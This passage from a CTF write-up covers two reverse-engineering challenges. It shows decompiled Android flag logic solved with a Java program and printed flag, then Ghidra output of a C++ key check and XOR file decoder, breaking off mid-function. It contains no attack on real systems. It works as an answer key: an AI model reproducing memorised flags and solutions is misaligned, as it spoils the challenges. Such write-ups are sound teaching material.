</span><span id=__span-1-28><a id=__codelineno-1-28 name=__codelineno-1-28 href=#__codelineno-1-28></a><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>trim</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>valid_user</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>n4ut1lus</span><span class=p>(</span><span class=n>trim2</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-1-29><a id=__codelineno-1-29 name=__codelineno-1-29 href=#__codelineno-1-29></a><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;flag{&quot;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>flag</span><span class=p>(</span><span class=n>Integer</span><span class=p>.</span><span class=na>toString</span><span class=p>(</span><span class=n>sl4y3r</span><span class=p>(</span><span class=n>sh4dy</span><span class=p>(</span><span class=n>trim2</span><span class=p>))),</span><span class=w> </span><span class=s>&quot;U|]rURuoU^PoR_FDMo@X]uBUg&quot;</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&quot;}&quot;</span><span class=p>;</span>
</span><span id=__span-1-30><a id=__codelineno-1-30 name=__codelineno-1-30 href=#__codelineno-1-30></a><span class=w>            </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-1-31><a id=__codelineno-1-31 name=__codelineno-1-31 href=#__codelineno-1-31></a><span class=w>        </span><span class=p>}</span>
</span><span id=__span-1-32><a id=__codelineno-1-32 name=__codelineno-1-32 href=#__codelineno-1-32></a><span class=w>        </span><span class=n>showToast</span><span class=p>(</span><span class=s>&quot;Invalid credentials. Please try again.&quot;</span><span class=p>);</span>
</span><span id=__span-1-33><a id=__codelineno-1-33 name=__codelineno-1-33 href=#__codelineno-1-33></a><span class=w>    </span><span class=p>}</span>
</span></code></pre></div></p> <p>We see that valid_password is already declared inside it. A quick google and we can tell that <code>AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR</code> is a constant in the <code>AppCompatDelegate</code> class with value equaling <code>108</code>.</p> <p><a class=glightbox href=rev/open_sesame/AppCompatDelegate.png data-type=image data-width=100% data-height=auto data-title=appcompatdelegate data-desc-position=bottom><img alt=appcompatdelegate src=rev/open_sesame/AppCompatDelegate.png></a></p> <p>This app only shows toast when the user password combination is wrong and only calculates the flag upon entering the correct credentials. We can just take the whole code and write our own <a href=rev/open_sesame/Sol.java>solution</a> that will print the flag.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-2-1><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a>backdoor/rev/open_sesame<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>?<span class=o>]</span><span class=w> </span>via<span class=w> </span>☕<span class=w> </span>v21
</span><span id=__span-2-2><a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>❯<span class=w> </span>javac<span class=w> </span>Sol.java
</span><span id=__span-2-3><a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>
</span><span id=__span-2-4><a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>backdoor/rev/open_sesame<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>?<span class=o>]</span><span class=w> </span>via<span class=w> </span>☕<span class=w> </span>v21
</span><span id=__span-2-5><a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>❯<span class=w> </span>java<span class=w> </span>Sol
</span><span id=__span-2-6><a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>flag<span class=o>{</span>aLiBabA_and_forty_thiEveS<span class=o>}</span>
</span></code></pre></div> <p>flag: <code>flag{aLiBabA_and_forty_thiEveS}</code></p> <hr> <h2 id=secret-door>Secret door<a class=headerlink href=#secret-door title="Permanent link">&para;</a></h2> <p>We were given a <a href=rev/secret_door/public.zip>zip</a> file that contained two files. One is the <a href=rev/secret_door/chall.out>challenge</a> binary and the other is an encoded binary <a href=rev/secret_door/encoded.bin>data</a> file that we need to decode.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-3-1><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>backdoor/rev/secret_door<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span>
</span><span id=__span-3-2><a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>❯<span class=w> </span>tree
</span><span id=__span-3-3><a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>.
</span><span id=__span-3-4><a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>├──<span class=w> </span>chall.out
</span><span id=__span-3-5><a id=__codelineno-3-5 name=__codelineno-3-5 href=#__codelineno-3-5></a>├──<span class=w> </span>encoded.bin
</span><span id=__span-3-6><a id=__codelineno-3-6 name=__codelineno-3-6 href=#__codelineno-3-6></a>└──<span class=w> </span>public.zip
</span></code></pre></div> <p>A c++ binary can be really annoying to reverse with gidhra. But I will just show some relevant codes that are interesting to the workflow of the binary.</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-4-1><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a><span class=w>  </span><span class=n>buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>operator</span><span class=p>.</span><span class=n>new</span><span class=p>[](</span><span class=mh>0x44</span><span class=p>);</span>
</span><span id=__span-4-2><a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a><span class=w>  </span><span class=n>piVar3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>func_4</span><span class=p>(</span><span class=n>buff</span><span class=p>,</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span><span id=__span-4-3><a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a><span class=w>  </span><span class=n>buf</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>func_3</span><span class=p>(</span><span class=n>piVar3</span><span class=p>,</span><span class=n>sus</span><span class=p>);</span>
</span><span id=__span-4-4><a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a><span class=w>  </span><span class=n>cVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>func_2</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span><span id=__span-4-5><a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cVar1</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;\0&#39;</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-4-6><a id=__codelineno-4-6 name=__codelineno-4-6 href=#__codelineno-4-6></a><span class=w>    </span><span class=n>std</span><span class=o>::</span><span class=n>operator</span><span class=o>&lt;&lt;</span><span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>cout</span><span class=p>,</span><span class=s>&quot;Wrong door&quot;</span><span class=p>);</span>
</span><span id=__span-4-7><a id=__codelineno-4-7 name=__codelineno-4-7 href=#__codelineno-4-7></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-4-8><a id=__codelineno-4-8 name=__codelineno-4-8 href=#__codelineno-4-8></a><span class=w>  </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-4-9><a id=__codelineno-4-9 name=__codelineno-4-9 href=#__codelineno-4-9></a><span class=w>    </span><span class=n>func_1</span><span class=p>(</span><span class=o>*</span><span class=n>buf</span><span class=p>,</span><span class=n>buf</span><span class=p>[</span><span class=mh>0x10</span><span class=p>]);</span>
</span><span id=__span-4-10><a id=__codelineno-4-10 name=__codelineno-4-10 href=#__codelineno-4-10></a><span class=w>  </span><span class=p>}</span>
</span></code></pre></div> <p>Here, we see that there is a new buffer of size 0x44 being created. Then some functions are called with this new buffer and our input argument 1 as parameters. The check only fails if <code>func_2</code> returns 0. Let's peek into func_2 to see what it does.</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-5-1><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a><span class=n>undefined8</span><span class=w> </span><span class=nf>func_2</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=o>*</span><span class=n>key</span><span class=p>)</span>
</span><span id=__span-5-2><a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>
</span><span id=__span-5-3><a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a><span class=p>{</span>
</span><span id=__span-5-4><a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a><span class=w>  </span><span class=n>undefined8</span><span class=w> </span><span class=n>uVar1</span><span class=p>;</span>
</span><span id=__span-5-5><a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>
</span><span id=__span-5-6><a id=__codelineno-5-6 name=__codelineno-5-6 href=#__codelineno-5-6></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(((((((</span><span class=o>*</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x4e</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=o>*</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xf</span><span class=p>)))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x78</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-7><a id=__codelineno-5-7 name=__codelineno-5-7 href=#__codelineno-5-7></a><span class=w>        </span><span class=p>((</span><span class=n>key</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x1f</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x78</span><span class=p>))))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-8><a id=__codelineno-5-8 name=__codelineno-5-8 href=#__codelineno-5-8></a><span class=w>       </span><span class=p>((</span><span class=n>key</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0xb</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>((</span><span class=n>key</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x74</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>6</span><span class=p>)))))))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-9><a id=__codelineno-5-9 name=__codelineno-5-9 href=#__codelineno-5-9></a><span class=w>      </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>100</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-10><a id=__codelineno-5-10 name=__codelineno-5-10 href=#__codelineno-5-10></a><span class=w>     </span><span class=p>((((</span><span class=n>key</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x21</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>99</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mh>0xb</span><span class=p>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x22</span><span class=p>)))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-11><a id=__codelineno-5-11 name=__codelineno-5-11 href=#__codelineno-5-11></a><span class=w>      </span><span class=p>(((</span><span class=n>key</span><span class=p>[</span><span class=mh>0xc</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x78</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mh>0xd</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>key</span><span class=p>[</span><span class=mh>0xc</span><span class=p>]))</span><span class=w> </span><span class=o>&amp;&amp;</span>
</span><span id=__span-5-12><a id=__codelineno-5-12 name=__codelineno-5-12 href=#__codelineno-5-12></a><span class=w>       </span><span class=p>((</span><span class=n>key</span><span class=p>[</span><span class=mh>0xe</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x72</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>((</span><span class=n>key</span><span class=p>[</span><span class=mh>0xf</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>key</span><span class=p>[</span><span class=mh>0xe</span><span class=p>]</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=p>[</span><span class=mh>0x10</span><span class=p>]</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mh>0x21</span><span class=p>))))))))))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-5-13><a id=__codelineno-5-13 name=__codelineno-5-13 href=#__codelineno-5-13></a><span class=w>    </span><span class=n>uVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span>
</span><span id=__span-5-14><a id=__codelineno-5-14 name=__codelineno-5-14 href=#__codelineno-5-14></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-5-15><a id=__codelineno-5-15 name=__codelineno-5-15 href=#__codelineno-5-15></a><span class=w>  </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-5-16><a id=__codelineno-5-16 name=__codelineno-5-16 href=#__codelineno-5-16></a><span class=w>    </span><span class=n>uVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-5-17><a id=__codelineno-5-17 name=__codelineno-5-17 href=#__codelineno-5-17></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-5-18><a id=__codelineno-5-18 name=__codelineno-5-18 href=#__codelineno-5-18></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=n>uVar1</span><span class=p>;</span>
</span><span id=__span-5-19><a id=__codelineno-5-19 name=__codelineno-5-19 href=#__codelineno-5-19></a><span class=p>}</span>
</span></code></pre></div> <p>It is clear that our input should be such that we need to pass this check and then the binary will call another function with the <strong>first</strong> and <strong>0x10th</strong> character of the newly created and modified through some functions. But if we look closely, we know what the 1<sup>st</sup> and 0x10th characters should be. They are matched against a fixed value inside <code>func_2</code>. They are <code>0x4e</code> and <code>0x21</code> respectively.</p> <p>Now let's see what happens inside <code>func_1</code></p> <div class="language-c highlight"><pre><span></span><code><span id=__span-6-1><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=cm>/* func_1(int, int) */</span>
</span><span id=__span-6-2><a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>
</span><span id=__span-6-3><a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a><span class=cm>/* DISPLAY WARNING: Type casts are NOT being printed */</span>
</span><span id=__span-6-4><a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>
</span><span id=__span-6-5><a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a><span class=n>undefined8</span><span class=w> </span><span class=nf>func_1</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>param_1</span><span class=p>,</span><span class=kt>int</span><span class=w> </span><span class=n>param_2</span><span class=p>)</span>
</span><span id=__span-6-6><a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a>
</span><span id=__span-6-7><a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a><span class=p>{</span>
</span><span id=__span-6-8><a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a><span class=w>  </span><span class=n>byte</span><span class=w> </span><span class=o>*</span><span class=n>pbVar1</span><span class=p>;</span>
</span><span id=__span-6-9><a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>lVar2</span><span class=p>;</span>
</span><span id=__span-6-10><a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span><span id=__span-6-11><a id=__codelineno-6-11 name=__codelineno-6-11 href=#__codelineno-6-11></a><span class=w>  </span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;</span><span class=w> </span><span class=n>local_48d</span><span class=p>;</span>
</span><span id=__span-6-12><a id=__codelineno-6-12 name=__codelineno-6-12 href=#__codelineno-6-12></a><span class=w>  </span><span class=n>uint</span><span class=w> </span><span class=n>i</span><span class=p>;</span>
</span><span id=__span-6-13><a id=__codelineno-6-13 name=__codelineno-6-13 href=#__codelineno-6-13></a><span class=w>  </span><span class=n>istreambuf_iterator</span><span class=w> </span><span class=n>local_488</span><span class=w> </span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span><span id=__span-6-14><a id=__codelineno-6-14 name=__codelineno-6-14 href=#__codelineno-6-14></a><span class=w>  </span><span class=n>allocator</span><span class=w> </span><span class=o>*</span><span class=n>local_480</span><span class=p>;</span>
</span><span id=__span-6-15><a id=__codelineno-6-15 name=__codelineno-6-15 href=#__codelineno-6-15></a><span class=w>  </span><span class=n>istreambuf_iterator</span><span class=o>&lt;&gt;</span><span class=w> </span><span class=n>local_478</span><span class=w> </span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
</span><span id=__span-6-16><a id=__codelineno-6-16 name=__codelineno-6-16 href=#__codelineno-6-16></a><span class=w>  </span><span class=n>allocator</span><span class=w> </span><span class=n>local_468</span><span class=w> </span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span><span id=__span-6-17><a id=__codelineno-6-17 name=__codelineno-6-17 href=#__codelineno-6-17></a><span class=w>  </span><span class=n>basic_string</span><span class=o>&lt;&gt;</span><span class=w> </span><span class=n>local_448</span><span class=w> </span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span><span id=__span-6-18><a id=__codelineno-6-18 name=__codelineno-6-18 href=#__codelineno-6-18></a><span class=w>  </span><span class=n>basic_ofstream</span><span class=o>&lt;&gt;</span><span class=w> </span><span class=n>local_428</span><span class=w> </span><span class=p>[</span><span class=mi>512</span><span class=p>];</span>
</span><span id=__span-6-19><a id=__codelineno-6-19 name=__codelineno-6-19 href=#__codelineno-6-19></a><span class=w>  </span><span class=n>basic_string</span><span class=w> </span><span class=n>local_228</span><span class=w> </span><span class=p>[</span><span class=mi>520</span><span class=p>];</span>
</span><span id=__span-6-20><a id=__codelineno-6-20 name=__codelineno-6-20 href=#__codelineno-6-20></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>local_20</span><span class=p>;</span>
</span><span id=__span-6-21><a id=__codelineno-6-21 name=__codelineno-6-21 href=#__codelineno-6-21></a>
</span><span id=__span-6-22><a id=__codelineno-6-22 name=__codelineno-6-22 href=#__codelineno-6-22></a><span class=w>  </span><span class=n>local_20</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>);</span>
</span><span id=__span-6-23><a id=__codelineno-6-23 name=__codelineno-6-23 href=#__codelineno-6-23></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>();</span>
</span><span id=__span-6-24><a id=__codelineno-6-24 name=__codelineno-6-24 href=#__codelineno-6-24></a><span class=w>                    </span><span class=cm>/* try { // try from 0010273e to 00102742 has its CatchHandler @ 0010292d */</span>
</span><span id=__span-6-25><a id=__codelineno-6-25 name=__codelineno-6-25 href=#__codelineno-6-25></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>__cxx11</span><span class=o>::</span><span class=n>basic_string</span><span class=o>&lt;&gt;::</span><span class=n>basic_string</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>local_448</span><span class=p>,</span><span class=s>&quot;encoded.bin&quot;</span><span class=p>,</span><span class=n>local_468</span><span class=p>);</span>
</span><span id=__span-6-26><a id=__codelineno-6-26 name=__codelineno-6-26 href=#__codelineno-6-26></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=n>local_468</span><span class=p>);</span>
</span><span id=__span-6-27><a id=__codelineno-6-27 name=__codelineno-6-27 href=#__codelineno-6-27></a><span class=w>                    </span><span class=cm>/* try { // try from 0010276b to 0010276f has its CatchHandler @ 001029a5 */</span>
</span><span id=__span-6-28><a id=__codelineno-6-28 name=__codelineno-6-28 href=#__codelineno-6-28></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ifstream</span><span class=o>&lt;&gt;::</span><span class=n>basic_ifstream</span><span class=p>(</span><span class=n>local_228</span><span class=p>,</span><span class=n>local_448</span><span class=p>);</span>
</span><span id=__span-6-29><a id=__codelineno-6-29 name=__codelineno-6-29 href=#__codelineno-6-29></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::</span><span class=n>allocator</span><span class=p>();</span>
</span><span id=__span-6-30><a id=__codelineno-6-30 name=__codelineno-6-30 href=#__codelineno-6-30></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>istreambuf_iterator</span><span class=o>&lt;&gt;::</span><span class=n>istreambuf_iterator</span><span class=p>(</span><span class=n>local_478</span><span class=p>);</span>
</span><span id=__span-6-31><a id=__codelineno-6-31 name=__codelineno-6-31 href=#__codelineno-6-31></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>istreambuf_iterator</span><span class=o>&lt;&gt;::</span><span class=n>istreambuf_iterator</span><span class=p>(</span><span class=n>local_488</span><span class=p>);</span>
</span><span id=__span-6-32><a id=__codelineno-6-32 name=__codelineno-6-32 href=#__codelineno-6-32></a><span class=w>                    </span><span class=cm>/* try { // try from 001027da to 001027de has its CatchHandler @ 0010294e */</span>
</span><span id=__span-6-33><a id=__codelineno-6-33 name=__codelineno-6-33 href=#__codelineno-6-33></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::</span><span class=n>vector</span><span class=o>&lt;&gt;</span><span class=p>(</span><span class=n>local_468</span><span class=p>,</span><span class=n>local_488</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>local_480</span><span class=p>);</span>
</span><span id=__span-6-34><a id=__codelineno-6-34 name=__codelineno-6-34 href=#__codelineno-6-34></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>allocator</span><span class=o>&lt;</span><span class=kt>char</span><span class=o>&gt;::~</span><span class=n>allocator</span><span class=p>(</span><span class=o>&amp;</span><span class=n>local_48d</span><span class=p>);</span>
</span><span id=__span-6-35><a id=__codelineno-6-35 name=__codelineno-6-35 href=#__codelineno-6-35></a><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>90246</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-6-36><a id=__codelineno-6-36 name=__codelineno-6-36 href=#__codelineno-6-36></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>i</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-6-37><a id=__codelineno-6-37 name=__codelineno-6-37 href=#__codelineno-6-37></a><span class=w>      </span><span class=n>pbVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::</span><span class=n>operator</span><span class=p>[](</span><span class=n>local_468</span><span class=p>,</span><span class=n>i</span><span class=p>);</span>
</span><span id=__span-6-38><a id=__codelineno-6-38 name=__codelineno-6-38 href=#__codelineno-6-38></a><span class=w>      </span><span class=o>*</span><span class=n>pbVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>pbVar1</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>param_1</span><span class=p>;</span>
</span><span id=__span-6-39><a id=__codelineno-6-39 name=__codelineno-6-39 href=#__codelineno-6-39></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-6-40><a id=__codelineno-6-40 name=__codelineno-6-40 href=#__codelineno-6-40></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-6-41><a id=__codelineno-6-41 name=__codelineno-6-41 href=#__codelineno-6-41></a><span class=w>      </span><span class=n>pbVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::</span><span class=n>operator</span><span class=p>[](</span><span class=n>local_468</span><span class=p>,</span><span class=n>i</span><span class=p>);</span>
</span><span id=__span-6-42><a id=__codelineno-6-42 name=__codelineno-6-42 href=#__codelineno-6-42></a><span class=w>      </span><span class=o>*</span><span class=n>pbVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>pbVar1</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=n>param_2</span><span class=p>;</span>
</span><span id=__span-6-43><a id=__codelineno-6-43 name=__codelineno-6-43 href=#__codelineno-6-43></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-6-44><a id=__codelineno-6-44 name=__codelineno-6-44 href=#__codelineno-6-44></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-6-45><a id=__codelineno-6-45 name=__codelineno-6-45 href=#__codelineno-6-45></a><span class=w>                    </span><span class=cm>/* try { // try from 00102885 to 00102889 has its CatchHandler @ 0010297e */</span>
</span><span id=__span-6-46><a id=__codelineno-6-46 name=__codelineno-6-46 href=#__codelineno-6-46></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ofstream</span><span class=o>&lt;&gt;::</span><span class=n>basic_ofstream</span><span class=p>(</span><span class=n>local_428</span><span class=p>,</span><span class=mi>1069148</span><span class=p>);</span>
</span><span id=__span-6-47><a id=__codelineno-6-47 name=__codelineno-6-47 href=#__codelineno-6-47></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::</span><span class=n>size</span><span class=p>(</span><span class=n>local_468</span><span class=p>);</span>
</span><span id=__span-6-48><a id=__codelineno-6-48 name=__codelineno-6-48 href=#__codelineno-6-48></a><span class=w>  </span><span class=n>lVar2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::</span><span class=n>data</span><span class=p>(</span><span class=n>local_468</span><span class=p>);</span>
</span><span id=__span-6-49><a id=__codelineno-6-49 name=__codelineno-6-49 href=#__codelineno-6-49></a><span class=w>                    </span><span class=cm>/* try { // try from 001028be to 001028d1 has its CatchHandler @ 00102966 */</span>
